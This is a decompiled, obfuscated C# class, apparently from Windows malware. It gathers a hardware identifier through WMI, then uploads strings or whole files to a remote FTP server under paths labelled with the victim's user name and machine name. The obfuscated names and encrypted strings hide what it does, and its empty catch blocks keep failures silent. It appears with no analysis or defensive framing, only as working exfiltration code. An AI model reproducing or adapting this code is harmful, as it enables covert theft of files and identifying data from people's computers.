using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

internal sealed class sZPczeNpmqvvGx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string DtviiZeOXPy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107367122));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107367133)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107367084);
			ManagementObject val3 = new ManagementObject(getString_0(107367079) + text + getString_0(107367582));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107367577)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107358991);
		}
	}

	public static void KiHrnySaRlG(string xGZAFjauuJzudp = "URL", string DKdswcxBSdOgFn = "USERNAME", string tTPNRWkCURWOOW = "ACCESO", string VhpNalVeEyE = "")
	{
		try
		{
			string text = DtviiZeOXPy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(xGZAFjauuJzudp + getString_0(107370787) + Environment.UserName + getString_0(107370742) + Environment.MachineName + getString_0(107370753) + text + getString_0(107370748));
			ftpWebRequest.Method = getString_0(107367552);
			ftpWebRequest.Credentials = new NetworkCredential(DKdswcxBSdOgFn, tTPNRWkCURWOOW);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(VhpNalVeEyE);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void XhECnYiopYgslf(string vjlclpTcWbpvS = "URL", string yszCnKLfQikgAS = "USERNAME", string IrSaQmKeuUtQm = "ACCESO", string csrEXYnPUwKia = "")
	{
		try
		{
			string text = DtviiZeOXPy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(vjlclpTcWbpvS + getString_0(107370787) + Environment.UserName + getString_0(107370742) + Environment.MachineName + getString_0(107370753) + text + getString_0(107370753) + Path.GetFileName(csrEXYnPUwKia));
			ftpWebRequest.Method = getString_0(107367552);
			ftpWebRequest.Credentials = new NetworkCredential(yszCnKLfQikgAS, IrSaQmKeuUtQm);
			byte[] array = File.ReadAllBytes(csrEXYnPUwKia);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static sZPczeNpmqvvGx()
	{
		Strings.CreateGetStringDelegate(typeof(sZPczeNpmqvvGx));
	}
}
